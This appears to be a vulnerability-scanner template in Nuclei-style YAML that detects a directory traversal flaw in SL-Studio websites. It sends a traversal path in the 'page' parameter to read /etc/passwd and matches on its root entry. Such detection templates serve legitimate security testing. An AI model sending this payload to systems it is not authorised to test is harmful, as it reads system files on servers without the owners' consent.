id: sl-studio-lfi

info:
  name: Webbdesign: SL-Studio. Directory Traversal
  author: 0x_Akoko
  severity: high
  reference: https://cxsecurity.com/issue/WLB-2018110187
  tags: slstudio,lfi

requests:
  - method: GET
    path:
      - "{{BaseURL}}/index.php?page=../../../../../../../../../../etc/passwd"

    matchers-condition: and
    matchers:

      - type: regex
        regex:
          - "root:[x*]:0:0"

      - type: status
        status:
          - 200
